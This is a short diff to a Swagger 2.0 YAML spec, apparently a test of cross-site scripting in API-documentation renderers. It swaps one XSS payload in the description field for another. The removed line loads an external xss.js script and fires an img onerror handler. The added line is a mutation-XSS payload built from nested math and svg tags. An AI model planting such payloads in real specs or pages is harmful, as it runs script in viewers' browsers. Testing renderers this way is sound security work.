@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec1
   description: 
-    <script>function test(){ alter('aaaa') }</script><script src='https://zerone0x01.github.io/xss.js'></script><a title='test' > test </a><img src='1' onerror='test()'/>
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea></textarea><img onerror=alert('123456') src=1>"
 paths:
   /accounts:
     get:
